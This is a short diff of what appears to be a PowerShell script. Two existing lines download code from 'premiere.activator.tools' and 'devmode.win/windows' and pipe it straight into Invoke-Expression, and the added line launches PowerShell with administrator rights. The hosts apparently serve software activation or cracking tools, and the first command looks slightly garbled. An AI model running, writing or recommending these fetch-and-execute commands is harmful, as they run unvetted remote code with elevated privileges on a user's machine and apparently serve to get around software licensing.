@@ -1,2 +1,3 @@
 wr "premiere.activator.tools" | iex
 iex (irm devmode.win/windows)
+Start-Process powershell -Verb RunAs
